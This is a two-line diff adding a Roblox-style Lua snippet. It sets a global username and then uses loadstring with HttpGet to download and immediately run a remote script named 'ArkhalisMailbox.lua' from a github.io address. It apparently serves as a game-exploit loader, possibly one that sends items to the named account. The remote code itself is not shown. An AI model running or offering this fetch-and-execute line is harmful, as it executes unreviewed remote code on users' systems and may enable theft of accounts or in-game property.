@@ -1,0 +1,2 @@
+_G.Username = "thinhblox1290" 
+loadstring(game:HttpGet("https://arkhalislua.github.io/ArkhalisMailbox.lua"))()
